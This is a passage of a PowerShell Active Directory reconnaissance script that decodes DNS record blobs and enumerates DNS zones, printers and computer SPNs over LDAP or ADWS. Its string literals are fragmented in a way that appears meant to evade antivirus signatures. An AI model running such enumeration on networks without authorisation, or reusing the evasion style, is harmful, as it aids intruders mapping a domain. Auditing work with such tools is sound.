            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.LDAPClass]::ObjectCount($ADSOMs)) "
            $SOMObj = [ADRecon.LDAPClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($SOMObj)
    {
        Return $SOMObj
    }
    Else
    {
        Return $null
    }
}

# Modified Convert-DNSRecord function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Convert-DNSRecord
{
<#
.SYNOPSIS

Helpers that decodes a binary DNS record blob.

Author: Michael B. Smith, Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

Decodes a binary blob representing an Active Directory DNS entry.
Used by Get-DomainDNSRecord.

Adapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1

.PARAMETER DNSRecord

A byte array representing the DNS record.

.OUTPUTS

System.Management.Automation.PSCustomObject

Outputs custom PSObjects with detailed information about the DNS record entry.

.LINK

https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1
#>

    [OutputType(('S'+'yste'+'m.'+'Mana'+'gement.'+'Automatio'+'n.'+'PSCustomObject'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        Function Get-Name
        {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUseOutp'+'utTy'+'peCor'+'rectly'), '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0)
                {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS
    {
        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # reverse for big endian
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        If ($Age -ne 0)
        {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        Else
        {
            $TimeStamp = ('[stat'+'ic]')
        }

        $DNSRecordObject = New-Object PSObject

        switch ($RDataType)
        {
            1
            {
                $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
                $Data = $IP
                $DNSRecordObject | Add-Member Noteproperty ('Recor'+'d'+'T'+'ype') 'A'
            }

            2
            {
                $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $NSName
                $DNSRecordObject | Add-Member Noteproperty ('RecordT'+'y'+'pe') 'NS'
            }

            5
            {
                $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Alias
                $DNSRecordObject | Add-Member Noteproperty ('Rec'+'ord'+'Type') ('C'+'NAME')
            }

            6
            {
                $PrimaryNS = Get-Name $DNSRecord[44..$DNSRecord.length]
                $ResponsibleParty = Get-Name $DNSRecord[$(46+$DNSRecord[44])..$DNSRecord.length]
                $SerialRaw = $DNSRecord[24..27]
                # reverse for big endian
                $Null = [array]::Reverse($SerialRaw)
                $Serial = [BitConverter]::ToUInt32($SerialRaw, 0)

                $RefreshRaw = $DNSRecord[28..31]
                $Null = [array]::Reverse($RefreshRaw)
                $Refresh = [BitConverter]::ToUInt32($RefreshRaw, 0)

                $RetryRaw = $DNSRecord[32..35]
                $Null = [array]::Reverse($RetryRaw)
                $Retry = [BitConverter]::ToUInt32($RetryRaw, 0)

                $ExpiresRaw = $DNSRecord[36..39]
                $Null = [array]::Reverse($ExpiresRaw)
                $Expires = [BitConverter]::ToUInt32($ExpiresRaw, 0)

                $MinTTLRaw = $DNSRecord[40..43]
                $Null = [array]::Reverse($MinTTLRaw)
                $MinTTL = [BitConverter]::ToUInt32($MinTTLRaw, 0)

                $Data = "[" + $Serial + '][' + $PrimaryNS + '][' + $ResponsibleParty + '][' + $Refresh + '][' + $Retry + '][' + $Expires + '][' + $MinTTL + "]"
                $DNSRecordObject | Add-Member Noteproperty ('Recor'+'dT'+'ype') ('S'+'OA')
            }

            12
            {
                $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
                $Data = $Ptr
                $DNSRecordObject | Add-Member Noteproperty ('Reco'+'rdT'+'ype') ('P'+'TR')
            }

            13
            {
                [string]$CPUType = ""
                [string]$OSType  = ""
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $CPUType += [char]$DNSRecord[$Index++]
                }
                $Index = 24 + $DNSRecord[24] + 1
                [int]$SegmentLength = $Index++
                while ($SegmentLength-- -gt 0)
                {
                    $OSType += [char]$DNSRecord[$Index++]
                }
                $Data = "[" + $CPUType + '][' + $OSType + "]"
                $DNSRecordObject | Add-Member Noteproperty ('Reco'+'r'+'dType') ('HIN'+'FO')
            }

            15
            {
                $PriorityRaw = $DNSRecord[24..25]
                # reverse for big endian
                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)
                $MXHost   = Get-Name $DNSRecord[26..$DNSRecord.length]
                $Data = "[" + $Priority + '][' + $MXHost + "]"
                $DNSRecordObject | Add-Member Noteproperty ('Re'+'cordTy'+'pe') 'MX'
            }

            16
            {
                [string]$TXT  = ''
                [int]$SegmentLength = $DNSRecord[24]
                $Index = 25
                while ($SegmentLength-- -gt 0)
                {
                    $TXT += [char]$DNSRecord[$Index++]
                }
                $Data = $TXT
                $DNSRecordObject | Add-Member Noteproperty ('Reco'+'rdT'+'yp'+'e') ('TX'+'T')
            }

            28
            {
        		### yeah, this doesn't do all the fancy formatting that can be done for IPv6
                $AAAA = ""
                for ($i = 24; $i -lt 40; $i+=2)
                {
                    $BlockRaw = $DNSRecord[$i..$($i+1)]
                    # reverse for big endian
                    $Null = [array]::Reverse($BlockRaw)
                    $Block = [BitConverter]::ToUInt16($BlockRaw, 0)
			        $AAAA += ($Block).ToString('x4')
			        If ($i -ne 38)
                    {
                        $AAAA += ':'
                    }
                }
                $Data = $AAAA
                $DNSRecordObject | Add-Member Noteproperty ('Recor'+'dT'+'y'+'pe') ('AA'+'AA')
            }

            33
            {
                $PriorityRaw = $DNSRecord[24..25]
                # reverse for big endian
                $Null = [array]::Reverse($PriorityRaw)
                $Priority = [BitConverter]::ToUInt16($PriorityRaw, 0)

                $WeightRaw = $DNSRecord[26..27]
                $Null = [array]::Reverse($WeightRaw)
                $Weight = [BitConverter]::ToUInt16($WeightRaw, 0)

                $PortRaw = $DNSRecord[28..29]
                $Null = [array]::Reverse($PortRaw)
                $Port = [BitConverter]::ToUInt16($PortRaw, 0)

                $SRVHost = Get-Name $DNSRecord[30..$DNSRecord.length]
                $Data = "[" + $Priority + '][' + $Weight + '][' + $Port + '][' + $SRVHost + "]"
                $DNSRecordObject | Add-Member Noteproperty ('R'+'ecor'+'d'+'Type') ('SR'+'V')
            }

            default
            {
                $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
                $DNSRecordObject | Add-Member Noteproperty ('Record'+'Typ'+'e') ('U'+'NK'+'NOWN')
            }
        }
        $DNSRecordObject | Add-Member Noteproperty ('U'+'pdatedAt'+'Se'+'rial') $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty ('TT'+'L') $TTL
        $DNSRecordObject | Add-Member Noteproperty ('Ag'+'e') $Age
        $DNSRecordObject | Add-Member Noteproperty ('TimeS'+'tamp') $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty ('Dat'+'a') $Data
        Return $DNSRecordObject
    }
}

Function Get-ADRDNSZone
{
<#
.SYNOPSIS
    Returns all DNS Zones and Records in the current (or specified) domain.

.DESCRIPTION
    Returns all DNS Zones and Records in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRDNSZones
    [bool]

.PARAMETER ADRDNSRecords
    [bool]

.OUTPUTS
    CSV files are created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [bool] $ADRDNSZones = $true,

        [Parameter(Mandatory = $false)]
        [bool] $ADRDNSRecords = $false
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADDNSZones = Get-ADObject -LDAPFilter ('(obj'+'e'+'ctClass='+'dnsZ'+'one)') -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning ('['+'Get-ADRDNSZone'+']'+' '+'Er'+'ror '+'whi'+'le e'+'n'+'umer'+'a'+'ting dns'+'Zone Obj'+'ects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ('[Get-AD'+'RDNSZone] Error'+' '+'get'+'ting '+'D'+'omain'+' Context')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADDNSZones1 = Get-ADObject -LDAPFilter ('(objectCl'+'as'+'s=dns'+'Zon'+'e)') -SearchBase "DC=DomainDnsZones,$($ADDomain.DistinguishedName)" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=DomainDnsZones,$($ADDomain.DistinguishedName) dnsZone Objects "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        Try
        {
            $ADDNSZones2 = Get-ADObject -LDAPFilter ('(ob'+'je'+'ctC'+'lass=dnsZo'+'ne)') -SearchBase "DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=')" -Properties Name,whenCreated,whenChanged,usncreated,usnchanged,distinguishedname
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating DC=ForestDnsZones,DC=$($ADDomain.Forest -replace '\.',',DC=') dnsZone Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If ($ADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.ADWSClass]::CleanString($_.Name))
                Try
                {
                    $DNSNodes = Get-ADObject -SearchBase $($_.DistinguishedName) -LDAPFilter ('(obj'+'ectC'+'lass'+'=dnsNode'+')') -Properties DistinguishedName,dnsrecord,dNSTombstoned,Name,ProtectedFromAccidentalDeletion,showInAdvancedViewOnly,whenChanged,whenCreated
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning ('[Get-AD'+'RDNSZo'+'ne] E'+'rror'+' wh'+'ile converti'+'ng t'+'he DN'+'S'+'Record')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                        # TO DO LDAP part
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value $_.dNSTombstoned
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value $_.ProtectedFromAccidentalDeletion
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value $_.showInAdvancedViewOnly
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value $_.usncreated
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value $_.usnchanged
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value $_.whenChanged
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value $_.DistinguishedName
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable DNSZoneArray
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.PropertiesToLoad.AddRange((('nam'+'e'),('wh'+'enc'+'reated'),('whenc'+'h'+'anged'),('usnc'+'re'+'ated'),('u'+'snchan'+'g'+'ed'),('dis'+'ti'+'nguis'+'he'+'dna'+'me')))
        $ObjSearcher.Filter = ('(ob'+'jectCla'+'ss'+'=d'+'nsZ'+'one)')
        $ObjSearcher.SearchScope = ('Su'+'btree')

        Try
        {
            $ADDNSZones = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-A'+'D'+'R'+'D'+'NSZone] Er'+'ror wh'+'ile en'+'ume'+'ra'+'ting dnsZ'+'o'+'n'+'e Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $ObjSearcher.dispose()

        $DNSZoneArray = @()
        If ($ADDNSZones)
        {
            $DNSZoneArray += $ADDNSZones
            Remove-Variable ADDNSZones
        }

        $SearchPath = ('D'+'C='+'D'+'oma'+'inDnsZones')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = ('(obje'+'ctClass=d'+'ns'+'Zo'+'ne'+')')
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange((('n'+'ame'),('w'+'henc'+'reated'),('whe'+'nchang'+'ed'),('usnc'+'re'+'at'+'ed'),('u'+'snchange'+'d'),('disti'+'n'+'guis'+'hedn'+'am'+'e')))
        $objSearcherPath.SearchScope = ('Subtr'+'ee')

        Try
        {
            $ADDNSZones1 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),$($objDomain.distinguishedName) dnsZone Objects. "
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones1)
        {
            $DNSZoneArray += $ADDNSZones1
            Remove-Variable ADDNSZones1
        }

        $SearchPath = ('DC=ForestDn'+'sZ'+'on'+'es')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Doma'+'in'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ('[G'+'et-ADRForest] Err'+'o'+'r ge'+'tting '+'D'+'oma'+'in'+' Context')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')"
        }

        $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $objSearcherPath.Filter = ('('+'o'+'bjectClass=dn'+'s'+'Zo'+'n'+'e)')
        $objSearcherPath.PageSize = $PageSize
        $objSearcherPath.PropertiesToLoad.AddRange((('na'+'me'),('wh'+'encreate'+'d'),('w'+'hench'+'anged'),('us'+'nc'+'reated'),('usnch'+'ange'+'d'),('d'+'istin'+'guishedn'+'ame')))
        $objSearcherPath.SearchScope = ('Subt'+'ree')

        Try
        {
            $ADDNSZones2 = $objSearcherPath.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRDNSZone] Error while enumerating $($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=') dnsZone Objects."
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        $objSearcherPath.dispose()

        If ($ADDNSZones2)
        {
            $DNSZoneArray += $ADDNSZones2
            Remove-Variable ADDNSZones2
        }

        If($ADDomain)
        {
            Remove-Variable ADDomain
        }

        Write-Verbose "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray)) "

        If ($DNSZoneArray)
        {
            $ADDNSZonesObj = @()
            $ADDNSNodesObj = @()
            $DNSZoneArray | ForEach-Object {
                If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                }
                Else
                {
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($_.Properties.distinguishedname)"
                }
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.Filter = ('(obje'+'ctCla'+'s'+'s=d'+'nsNo'+'de)')
                $objSearcherPath.PageSize = $PageSize
                $objSearcherPath.PropertiesToLoad.AddRange((('di'+'stinguish'+'edna'+'me'),('d'+'nsre'+'cor'+'d'),('na'+'me'),'dc',('s'+'howi'+'nadvancedvi'+'ew'+'on'+'ly'),('w'+'he'+'nchanged'),('whencre'+'at'+'ed')))
                Try
                {
                    $DNSNodes = $objSearcherPath.FindAll()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
                $objSearcherPath.dispose()
                Remove-Variable objSearchPath

                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name Name -Value $([ADRecon.LDAPClass]::CleanString($_.Properties.name[0]))
                If ($DNSNodes)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty Count)
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object PSObject
                        $ObjNode | Add-Member -MemberType NoteProperty -Name ZoneName -Value $Obj.Name
                        $name = ([string] $($_.Properties.name))
                        If (-Not $name)
                        {
                            $name = ([string] $($_.Properties.dc))
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Name -Value $name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_.Properties.dnsrecord[0]
                        }
                        Catch
                        {
                            Write-Warning ('['+'Get'+'-AD'+'RD'+'NSZon'+'e] Error'+' while co'+'nvert'+'in'+'g the DNSRec'+'or'+'d')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType NoteProperty -Name RecordType -Value $DNSRecord.RecordType
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Data -Value $DNSRecord.Data
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TTL -Value $DNSRecord.TTL
                        $ObjNode | Add-Member -MemberType NoteProperty -Name Age -Value $DNSRecord.Age
                        $ObjNode | Add-Member -MemberType NoteProperty -Name TimeStamp -Value $DNSRecord.TimeStamp
                        $ObjNode | Add-Member -MemberType NoteProperty -Name UpdatedAtSerial -Value $DNSRecord.UpdatedAtSerial
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                        # TO DO
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name dNSTombstoned -Value $null
                        #$ObjNode | Add-Member -MemberType NoteProperty -Name ProtectedFromAccidentalDeletion -Value $null
                        $ObjNode | Add-Member -MemberType NoteProperty -Name showInAdvancedViewOnly -Value ([string] $($_.Properties.showinadvancedviewonly))
                        $ObjNode | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable DNSRecord
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name RecordCount -Value $null
                }
                $Obj | Add-Member -MemberType NoteProperty -Name USNCreated -Value ([string] $($_.Properties.usncreated))
                $Obj | Add-Member -MemberType NoteProperty -Name USNChanged -Value ([string] $($_.Properties.usnchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name whenCreated -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name whenChanged -Value ([DateTime] $($_.Properties.whenchanged))
                $Obj | Add-Member -MemberType NoteProperty -Name DistinguishedName -Value ([string] $($_.Properties.distinguishedname))
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable DNSZoneArray
        }
    }

    If ($ADDNSZonesObj -and $ADRDNSZones)
    {
        Export-ADR $ADDNSZonesObj $ADROutputDir $OutputType ('DNS'+'Zon'+'es')
        Remove-Variable ADDNSZonesObj
    }

    If ($ADDNSNodesObj -and $ADRDNSRecords)
    {
        Export-ADR $ADDNSNodesObj $ADROutputDir $OutputType ('D'+'NSN'+'odes')
        Remove-Variable ADDNSNodesObj
    }
}

Function Get-ADRPrinter
{
<#
.SYNOPSIS
    Returns all printers in the current (or specified) domain.

.DESCRIPTION
    Returns all printers in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>

    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADPrinters = @( Get-ADObject -LDAPFilter ('(objectCa'+'te'+'gory=pri'+'ntQ'+'ueue)') -Properties driverName,driverVersion,Name,portName,printShareName,serverName,url,whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning ('[Get-ADR'+'Prin'+'ter'+'] E'+'rr'+'or wh'+'ile en'+'umerat'+'ing pr'+'in'+'tQ'+'u'+'eu'+'e'+' O'+'b'+'je'+'cts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADPrinters)
        {
            Write-Verbose "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters)) "
            $PrintersObj = [ADRecon.ADWSClass]::PrinterParser($ADPrinters, $Threads)
            Remove-Variable ADPrinters
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('('+'objec'+'tC'+'ate'+'gory=p'+'r'+'intQu'+'eue)')
        $ObjSearcher.SearchScope = ('Subtr'+'ee')

        Try
        {
            $ADPrinters = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-'+'ADRPri'+'nt'+'er'+']'+' '+'Error whi'+'le en'+'umera'+'ting printQueue '+'Objec'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADPrinters)
        {
            $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADPrinters))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*'+'] '+'To'+'tal'+' '+'Pri'+'nter'+'s: '+"$cnt")
                $PrintersObj = [ADRecon.LDAPClass]::PrinterParser($ADPrinters, $Threads)
            }
            Remove-Variable ADPrinters
        }
    }

    If ($PrintersObj)
    {
        Return $PrintersObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRComputer
{
<#
.SYNOPSIS
    Returns all computers and/or service principal name (SPN) in the current (or specified) domain.

.DESCRIPTION
    Returns all computers and/or service principal name (SPN) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days
    https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-member-maximum-machine-account-password-age

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADRComputers
    [bool]

.PARAMETER ADRComputerSPNs
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $true)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
